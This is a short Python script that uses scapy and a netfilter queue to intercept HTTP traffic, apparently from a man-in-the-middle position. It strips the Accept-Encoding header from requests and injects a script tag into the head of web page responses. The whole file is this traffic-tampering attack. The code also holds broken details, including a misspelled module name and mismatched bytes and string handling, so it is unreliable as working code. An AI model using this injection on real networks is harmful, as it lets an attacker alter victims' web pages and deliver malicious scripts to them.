#!/usr/bin/python

import  netfilterqueve
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport ==80:
            print("[+] Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load.decode())

        elif scapy_packet[scapy.TCP].sport ==80:
            print("[+] Response ")
            load = load.replace(b"<head>", b"<script>alert('test');</script></head>")
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
                






    packet.accept()


queve = netfilterqueve.NetfilterQueve()
queve.bind(0, process_packet)
queve.run()
